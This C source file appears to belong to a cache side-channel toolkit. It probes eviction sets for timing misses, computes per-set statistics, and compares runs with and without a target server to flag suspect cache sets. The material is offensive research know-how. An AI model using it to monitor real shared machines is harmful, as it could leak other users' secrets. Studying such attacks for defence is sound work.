#include "EvictionSet.h"
#include "CacheFuncs.h"

#include <time.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>

void GetMemoryStatistics(Cache_Mapping* pEvictionSets, Cache_Statistics* pCacheStats)
{
	qword* pSetInterMissTimings[SETS_IN_CACHE];
	int pSetTimingsNum[SETS_IN_CACHE];
	int Set;
	int Sample;
	struct timespec start, end;
	qword TimeSpent;
	int Miss;
	clock_gettime(CLOCK_REALTIME, &start);

	// Go over all sets in the cache and generate their statistics.
	for (Set = 0; Set < SETS_IN_CACHE; Set++)
	{
		pSetInterMissTimings[Set] = malloc(sizeof(qword) * (CACHE_POLL_SAMPLES_PER_SET + 1));
		pSetInterMissTimings[Set][0] = 0;
		pSetTimingsNum[Set] = 1;
		Miss = 0;

		// Sample the sets a pre-determined amount of times.
		for (Sample = 1; Sample <= CACHE_POLL_SAMPLES_PER_SET; Sample++)
		{
			clock_gettime(CLOCK_REALTIME, &start);

			Miss = PollAsm(pEvictionSets->Sets[Set].Lines[0], pEvictionSets->Sets[Set].ValidLines);// pEvictionSets->Sets[Set].ValidLines - 1);

			// If we got a miss, add it to the statistics (do not need to add hits, since
			// all time slots were inited as hits by default.
			if (Miss)
			{
				pSetInterMissTimings[Set][pSetTimingsNum[Set]] = Sample;
				pSetTimingsNum[Set]++;
			}

			do {
				clock_gettime(CLOCK_REALTIME, &end);
				TimeSpent = (qword)(end.tv_nsec - start.tv_nsec) + (qword)(end.tv_sec - start.tv_sec) * 1000000000;
			} while (TimeSpent < CACHE_POLL_TIMEOUT_IN_NANO);

		}
	}

	printf("Parsing the data!\r\n");

	// Time to parse the data.
	for (Set = 0; Set < SETS_IN_CACHE; Set++)
	{
		double Mean = 0;
		double Var = 0;
		double Tmp;

		if (pSetTimingsNum[Set] <= 1)
			continue;

		Mean = pSetInterMissTimings[Set][pSetTimingsNum[Set] - 1];
		Mean /= (pSetTimingsNum[Set] - 1);
		pCacheStats->SetStats[Set].mean = Mean;
		pCacheStats->SetStats[Set].num = pSetTimingsNum[Set] - 1;
		pCacheStats->SetStats[Set].offset = (long int)(pEvictionSets->Sets[Set].Lines[0]) % (SETS_IN_SLICE * 64);

		// Calculate Mean and variance
		for (Sample = 1; Sample < pSetTimingsNum[Set]; Sample++)
		{
			Tmp = (pSetInterMissTimings[Set][Sample] - pSetInterMissTimings[Set][Sample - 1]) - Mean;
			Var += Tmp * Tmp;
		}

		Var /= (pSetTimingsNum[Set] - 1);
		pCacheStats->SetStats[Set].variance = Var;
	}

	for (Set = 0; Set < SETS_IN_CACHE; Set++)
	{
		free(pSetInterMissTimings[Set]);
	}
}

void SortStatistics(Cache_Statistics* BaseStatistics, Cache_Statistics* StatisticsToSort)
{
	unsigned int FirstIdx, SecondIdx, Set, tmp;

	for (Set = 0; Set < SETS_IN_CACHE; Set++)
	{
		StatisticsToSort->SetStats[Set].num = BaseStatistics->SetStats[Set].num;
		StatisticsToSort->SetStats[Set].mean = Set;
	}

	for (FirstIdx = 0; FirstIdx < SETS_IN_CACHE; FirstIdx++)
	{
		for (SecondIdx = 0; SecondIdx + 1 < SETS_IN_CACHE - FirstIdx; SecondIdx++)
		{
			if (StatisticsToSort->SetStats[SecondIdx + 1].num < StatisticsToSort->SetStats[SecondIdx].num)
			{
				tmp = StatisticsToSort->SetStats[SecondIdx].num;
				StatisticsToSort->SetStats[SecondIdx].num = StatisticsToSort->SetStats[SecondIdx + 1].num;
				StatisticsToSort->SetStats[SecondIdx + 1].num = tmp;
				tmp = StatisticsToSort->SetStats[SecondIdx].mean;
				StatisticsToSort->SetStats[SecondIdx].mean = StatisticsToSort->SetStats[SecondIdx + 1].mean;
				StatisticsToSort->SetStats[SecondIdx + 1].mean = tmp;
			}
		}
	}
}

int compareStats(Cache_Mapping* pEvictionSets, int* suspectsSets, int SetsFound,Cache_Statistics* withoutServer, Cache_Statistics* withServer){
	FILE* out;
	int i;
	int numberOfSuspects = 0;
	Cache_Statistics orderd_results,results;
	memset(&results,0,sizeof(Cache_Statistics));
	memset(&orderd_results,0,sizeof(Cache_Statistics));
	out = fopen("compareStats.txt","w");
	for(i =0 ; i < SetsFound ; i++){
		long long num = withServer->SetStats[i].num - withoutServer->SetStats[i].num;
		if(num > 0)
			results.SetStats[i].num = num;
		if(results.SetStats[i].num > ZERO_ONE_STATISTICS_DIFF_THR){
			suspectsSets[numberOfSuspects] = i;
			numberOfSuspects++;
		}
	}
	SortStatistics(&results,&orderd_results);
	for(i = 0 ; i< SetsFound ; i++ ){
		fprintf(out,"%lld\n",orderd_results.SetStats[i].num);
	}
	fclose(out);
	return numberOfSuspects;
}

